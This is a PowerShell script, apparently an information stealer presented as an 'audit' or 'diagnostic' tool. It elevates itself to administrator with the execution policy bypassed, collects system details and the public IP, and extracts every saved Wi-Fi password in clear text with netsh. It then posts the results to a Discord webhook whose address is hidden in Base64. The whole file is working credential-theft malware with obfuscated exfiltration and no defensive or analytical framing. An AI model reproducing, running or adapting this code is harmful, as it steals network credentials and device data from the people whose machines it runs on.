# ========== CONFIG ==========
$VerboseMode = $true
$Version = "2.2.1"

# ========== ENCODED ENDPOINTS ==========
$D_Hook_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=="
$D_Hook = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($D_Hook_B64))

# ========== CORE UTILITIES ==========
function Write-InternalLog {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Msg,
        [string]$Col = "Cyan"
    )
    if ($VerboseMode) {
        Write-Host "[*] $Msg" -ForegroundColor $Col
    }
}

function Invoke-PrivilegeAssertion {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        Write-InternalLog "Escalating context..."
        try {
            Start-Process -FilePath powershell -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"" -Verb RunAs
        } catch {
            Write-InternalLog "Escalation failed: $($_.Exception.Message)" "Red"
        }
        exit 1
    }
}

# ========== DATA COLLECTION ==========
function Get-EnvironmentMetrics {
    Write-InternalLog "Collecting environment metrics..."
    try {
        $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
        $gpu = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        $mem = Get-CimInstance Win32_PhysicalMemory -ErrorAction SilentlyContinue | Measure-Object -Property Capacity -Sum
        $publicIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5) } catch { "Unknown" }
        
        $m_Host = $env:COMPUTERNAME
        $m_Model = if ($cs) { $cs.Model } else { "N/A" }
        $m_Vendor = if ($cs) { $cs.Manufacturer } else { "N/A" }
        $m_OS = if ($os) { $os.Caption } else { "N/A" }
        $m_Build = if ($os) { $os.Version } else { "N/A" }
        $m_CPU = if ($cpu) { ($cpu | Select-Object -First 1).Name } else { "N/A" }
        $m_Cores = if ($cpu) { ($cpu | Select-Object -First 1).NumberOfCores } else { 0 }
        $m_RAM = if ($mem.Sum) { [Math]::Round($mem.Sum / 1GB, 2) } else { 0 }
        $m_GPU = if ($gpu) { ($gpu | Select-Object -First 1).Name } else { "N/A" }
        
        return [PSCustomObject]@{
            HostName     = $m_Host
            Model        = $m_Model
            Manufacturer = $m_Vendor
            Platform     = $m_OS
            Build        = $m_Build
            Processor    = $m_CPU
            LogicCores   = $m_Cores
            MemoryGB     = $m_RAM
            Graphics     = $m_GPU
            ExternalIP   = $publicIp
            Timestamp    = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            Revision     = $Version
        }
    } catch {
        Write-InternalLog "Metrics collection error: $($_.Exception.Message)" "Red"
        return $null
    }
}

function Get-NetworkCredentials {
    Write-InternalLog "Extracting network credentials..."
    try {
        $profiles = netsh wlan show profiles 2>$null |
            Select-String "All User Profile" |
            ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() } | Sort-Object -Unique

        $results = @()
        foreach ($p in $profiles) {
            $info = netsh wlan show profile name="$p" key=clear 2>$null
            $key = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
            if (-not $key) { $key = "<Unsecured or No Local Cache>" }
            $results += [PSCustomObject]@{ SSID = $p; KeyValue = $key }
        }
        return $results
    } catch {
        Write-InternalLog "Credentials extraction error: $($_.Exception.Message)" "Red"
        return @()
    }
}

# ========== PACKAGE GENERATION ==========
function New-AuditPackage {
    param(
        [Parameter(Mandatory=$true)]
        $Metrics,
        [Parameter(Mandatory=$true)]
        $NetworkData
    )
    
    $sb = New-Object System.Text.StringBuilder
    [void]$sb.AppendLine("=========================================")
    [void]$sb.AppendLine("      AUDIT PACKAGE - $Version")
    [void]$sb.AppendLine("=========================================")
    [void]$sb.AppendLine("METRICS:")
    [void]$sb.AppendLine("-----------------------------------------")
    [void]$sb.AppendLine("Host          : $($Metrics.HostName)")
    [void]$sb.AppendLine("Model         : $($Metrics.Model)")
    [void]$sb.AppendLine("Vendor        : $($Metrics.Manufacturer)")
    [void]$sb.AppendLine("Platform      : $($Metrics.Platform) ($($Metrics.Build))")
    [void]$sb.AppendLine("CPU           : $($Metrics.Processor) ($($Metrics.LogicCores) Cores)")
    [void]$sb.AppendLine("RAM           : $($Metrics.MemoryGB) GB")
    [void]$sb.AppendLine("GPU           : $($Metrics.Graphics)")
    [void]$sb.AppendLine("External IP   : $($Metrics.ExternalIP)")
    [void]$sb.AppendLine("Time          : $($Metrics.Timestamp)")
    [void]$sb.AppendLine("")
    [void]$sb.AppendLine("CREDENTIALS:")
    [void]$sb.AppendLine("-----------------------------------------")
    
    foreach ($c in $NetworkData) {
        [void]$sb.AppendLine("SSID: $($c.SSID)")
        [void]$sb.AppendLine("KEY:  $($c.KeyValue)")
        [void]$sb.AppendLine("-----------------------------------------")
    }
    
    [void]$sb.AppendLine("")
    [void]$sb.AppendLine("[PACKAGE COMPLETE]")
    return $sb.ToString()
}

# ========== DATA DISPATCH ==========
function Send-DiagnosticData {
    param(
        [Parameter(Mandatory=$true)]
        [string]$RawContent
    )
    
    Write-InternalLog "Dispatching via Channel D..."
    try {
        $contentToUpload = $RawContent
        if ($contentToUpload.Length -gt 1900) {
            $contentToUpload = $contentToUpload.Substring(0, 1900) + "... [Truncated]"
        }
        
        $discordBody = @{
            content = "New Diagnostic Package from $($env:COMPUTERNAME)"
            embeds = @(
                @{
                    title = "Audit Results"
                    description = "```$contentToUpload```"
                    color = 3447003
                }
            )
        }
        
        $jsonPayload = $discordBody | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $D_Hook -Method Post -Body $jsonPayload -ContentType "application/json"
        Write-InternalLog "Channel D success." "Green"
    } catch {
        Write-InternalLog "Channel D fail: $($_.Exception.Message)" "Red"
    }
}

# ========== EXECUTION FLOW ==========
function Invoke-AuditFlow {
    Invoke-PrivilegeAssertion

    $currentMetrics = Get-EnvironmentMetrics
    if ($null -eq $currentMetrics) { 
        Write-InternalLog "Critical failure: No metrics collected." "Red"
        exit 
    }

    $networkCreds = Get-NetworkCredentials
    $fullPackage = New-AuditPackage -Metrics $currentMetrics -NetworkData $networkCreds

    Send-DiagnosticData -RawContent $fullPackage

    Write-InternalLog "Audit flow complete." "Green"
}

# Run
Invoke-AuditFlow
